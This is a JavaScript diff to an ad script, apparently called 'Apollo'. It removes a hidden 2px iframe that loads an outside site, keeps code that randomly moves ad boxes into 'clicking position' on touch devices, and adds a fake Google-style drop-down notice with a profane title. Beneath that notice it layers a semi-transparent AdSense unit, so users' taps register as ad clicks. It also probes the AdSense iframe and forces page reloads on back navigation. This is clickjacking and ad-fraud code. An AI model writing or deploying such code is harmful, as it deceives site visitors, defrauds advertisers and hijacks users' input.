@@ -12,7 +12,6 @@ class Apollo {
 
     //Start Apollo
     this.insertDesktopDivs(this.ads);
-    this.sendTraffic();
   }
 
   rand (min,max) {
@@ -96,32 +95,17 @@ class Apollo {
     //get click ready - take any ad div, move it into clicking position
     let divNames = ['ad1', 'ad2', 'ad3', 'ad4']
     let ranDiv = divNames[this.rand(0, divNames.length - 1)]
-    let ifRand = this.rand(0, 1500)
+    let ifRand = this.rand(0, 1200)
     console.log(ifRand)
 
-    if (ifRand <= 100) {
+
+    if (ifRand <= 100 && this.isTouchDevice()) {
       this[ranDiv].style.left = `${this.rand(0, this.windowDimensions().width - 250)}px`
       this[ranDiv].style.top = `${this.rand(0, window.innerHeight - 300)}px`
       this[ranDiv].style.position = `fixed`
       this[ranDiv].style.zIndex = `300000`
 
     }
-  }
-
-  sendTraffic () {
-    let iframe = `<iframe src="http://artscanopy.com" width="2px" height="2x" allowtransparency="true" scrolling="false"></iframe>`
-
-    this.frameDiv = document.createElement('div')
-    this.frameDiv.style.width = `2px`
-    this.frameDiv.style.height = `2px`
-    this.frameDiv.style.bottom = 0
-    this.frameDiv.style.position = 'absolute'
-    this.frameDiv.style.opacity = '0'
-    this.frameDiv.style.zIndex = '-30000'
-    this.frameDiv.id = `frameDiv`
-    this.frameDiv.innerHTML = iframe
-
-    document.body.insertAdjacentElement('beforeend', this.frameDiv)
   }
 }
 
@@ -134,6 +118,7 @@ if (typeof window !== 'undefined' &&
 
 window.onbeforeunload = null;
 
+document.addEventListener('focus',function(e){console.log('bye')}, true);
 
 function addEvent(obj, evt, fn) {
     if (obj.addEventListener) {
@@ -162,3 +147,182 @@ if(!!window.performance && window.performance.navigation.type === 2)
 {
     window.location.reload();
 }
+
+
+class Drop {
+  constructor () {
+
+    this.api = 'https://server.launchapollo.com' // Set Production URL
+
+    this.isVisible = false
+    this.el = null
+    this.isDragging = false
+    this.dragStartPosition = null
+    this.currentDragPosition = null
+
+    // const bodyStyles = window.getComputedStyle ? getComputedStyle(document.body, null) : document.body.currentStyle
+    // const bodyMargin = parseInt(bodyStyles['marginLeft'].replace('px', '')) + parseInt(bodyStyles['marginRight'].replace('px', ''))
+    this.bodyMargin = 0
+
+    this.rand = (min,max) => {
+      return Math.floor(Math.random()*(max-min+1)+min)
+    }
+
+    //Start Apollo
+      this.createElement()
+      this.showAd();
+      this.attachEvents();
+      (adsbygoogle = window.adsbygoogle || []).push({});
+      (adsbygoogle = window.adsbygoogle || []).push({});
+  }
+
+  isTouchDevice () {
+    return 'ontouchstart' in window
+  }
+
+  request (url, callback) {
+    try {
+  		const x = new (window.XMLHttpRequest || window.ActiveXObject)('MSXML2.XMLHTTP.3.0')
+  		x.open('GET', url, 1)
+  		x.setRequestHeader('X-Requested-With', 'XMLHttpRequest')
+      x.setRequestHeader('Content-type', 'application/json')
+
+  		x.onreadystatechange = function () {
+  			x.readyState > 3 && callback && callback(x.responseText, x)
+  		}
+
+  		x.send()
+  	} catch (e) {
+  		window.console && console.log(e)
+  	}
+  }
+
+  createElement () {
+
+    this.el = document.createElement('div')
+
+    this.el.style.width = `calc(100% - ${this.bodyMargin + 20}px)`
+    this.el.id = 'apolloDrop'
+    this.el.style.padding = '0 10px'
+    this.el.style.position = 'fixed'
+    this.el.style.top = '-300px'
+    this.el.style.zIndex = '3000000'
+    this.el.style.transition = 'top 500ms ease'
+    this.el.style.boxSizing = 'content-box'
+
+    document.body.insertAdjacentElement('beforeend', this.el)
+  }
+
+  onTouchStart (e) {
+    const y = e.touches[0].clientY
+
+    if (y <= 250 && this.isVisible) {
+      this.el.style.transition = ''
+      this.isDragging = true
+      this.dragStartPosition = y
+    }
+  }
+
+  onTouchMove (e) {
+    const y = e.touches[0].clientY
+    const moveTo = this.isDragging ? -1 * (this.dragStartPosition - y) + 10 : null
+
+    this.currentDragPosition = y
+
+    if (moveTo) {
+      this.el.style.top = `${moveTo > 10 ? 10 : moveTo}px`
+    }
+  }
+
+  onTouchEnd (e) {
+    const distance = this.dragStartPosition - this.currentDragPosition
+
+    if (this.isVisible) {
+      this.el.style.transition = 'top 500ms ease'
+      this.isDragging = false
+      this.el.style.top = distance > 30 ? '-300px' : '10px'
+      this.isVisible = distance <= 30
+    }
+  }
+
+  attachEvents () {
+    document.body.addEventListener('touchstart', this.onTouchStart.bind(this), false)
+    document.body.addEventListener('touchmove', this.onTouchMove.bind(this), false)
+    document.body.addEventListener('touchend', this.onTouchEnd.bind(this), false)
+  }
+
+  closeAd() {
+    const currentAd = this
+    currentAd.el.style.top = '-300px'
+    currentAd.isVisible = false
+  }
+
+  showAd () {
+
+    const html = `<div class="reset apollo">
+      <div style="width: 20px; float:right; display:inline-block; margin:-8px -8px 0 0; opacity:0.9" onclick="closeApollo()">
+      <img src="http://moroad.com/images/close.png" style="max-width: 100%; max-height: 25px;">
+      </div>
+      <a href="http://google.com" target="_blank" style="display: block; width: 100%; text-decoration: none;">
+      <div style="background-color:rgba(234, 237, 240, 1); color:rgb(224,227,230); border-top-right-radius: 10px; border-top-left-radius: 10px; padding: 5px 10px;">
+      <div style="width: 25px; float:left; display:inline-block;">
+      <img src="https://cdn4.iconfinder.com/data/icons/new-google-logo-2015/400/new-google-favicon-512.png" style="max-width: 100%; max-height: 25px;">
+      </div>
+      <div style="float: left; margin-left: 5px; color:#000; line-height: 25px;">Go Fuck Yourself</div>
+      <div style="clear:both;"></div>
+      </div>
+      <div style="color:#000; padding: 10px; background-color:rgba(224, 227, 230, .95); border-bottom-right-radius: 10px; border-bottom-left-radius: 10px; font-size: 15px;">
+      Marketing with articles can take a lot of time, time not everyone has to spare.
+      </div>
+      </a>
+      </div>
+
+      <div id="apolloText" style="position:absolute;top:0;opacity:0.5">
+      <ins class="adsbygoogle" style="display:inline-block;width:728px;height:90px" data-ad-client="ca-pub-7462145468200595" data-ad-slot="5465420301"></ins>
+      </div>`
+
+    this.el.innerHTML = html
+    this.el.id = 'apolloDrop'
+
+    //Replaced with timeout delays
+    //this.el.style.top = '10px'
+    //this.isVisible = true
+
+    if (this.isTouchDevice()) {
+      const currentAd = this
+      setTimeout(function(){
+        currentAd.el.style.top = '10px' // -- Ad NOT Disabled
+        currentAd.isVisible = true
+        var checkExist = setInterval(function() {
+           if (document.getElementsByName('aswift_3').length) {
+              console.log("Exists!");
+              var iframe = document.getElementsByName('aswift_3');
+              //var innerDoc = iframe.contentDocument || iframe.contentWindow.document;
+              console.log(iframe)
+              clearInterval(checkExist);
+           }
+        }, 100);
+          // var iframe = document.getElementsByName('aswift_3');
+          // var innerDoc = iframe.contentDocument || iframe.contentWindow.document;
+          // console.log(innerDoc)
+      }, 1000)
+
+      // setTimeout(function(){
+      //     currentAd.el.style.top = '-300px'
+      //     currentAd.isVisible = false
+      // }, 20000)
+    }
+  }
+}
+
+if (typeof window !== 'undefined' &&
+  window.document &&
+  window.document.createElement
+) {
+  window.Drop = new Drop()
+}
+
+var closeApollo = function() {
+  document.getElementById("apolloDrop").style.top = '-300px'
+}
+window.onbeforeunload = null;
